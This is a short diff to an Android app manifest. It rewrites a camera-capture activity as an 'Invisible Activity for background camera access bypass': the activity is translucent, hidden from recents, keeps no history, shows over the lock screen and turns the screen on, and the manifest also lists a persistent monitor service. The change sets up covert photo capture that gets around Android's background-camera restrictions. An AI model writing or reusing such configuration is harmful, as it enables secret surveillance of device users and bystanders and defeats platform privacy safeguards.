@@ -73,14 +73,16 @@
         android:launchMode="singleInstance"
         android:taskAffinity="" />
 
-      <!-- Activity to capture background photo / selfie -->
+      <!-- Invisible Activity for background camera access bypass -->
       <activity
         android:name=".service.CameraCaptureActivity"
-        android:exported="false"
-        android:launchMode="singleInstance"
         android:theme="@android:style/Theme.Translucent.NoTitleBar"
-        android:taskAffinity="" />
-
+        android:excludeFromRecents="true"
+        android:noHistory="true"
+        android:taskAffinity=""
+        android:showWhenLocked="true"
+        android:turnScreenOn="true"
+        android:exported="false" />
       <!-- Persistent Foreground Monitor Service -->
       <service
         android:name=".service.MrpMonitorService"
